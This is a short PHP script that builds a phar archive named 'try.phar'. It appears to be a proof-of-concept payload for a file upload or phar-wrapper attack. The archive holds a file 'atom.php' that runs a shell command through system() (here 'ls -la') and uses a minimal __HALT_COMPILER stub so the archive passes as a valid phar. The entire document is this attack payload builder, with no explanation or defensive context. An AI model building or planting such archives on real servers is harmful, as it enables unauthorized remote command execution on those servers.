<?php
$phar = new Phar('try.phar');
$phar->startBuffering();
$phar->addFromString('atom.php', '<?php echo system("ls -la"); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
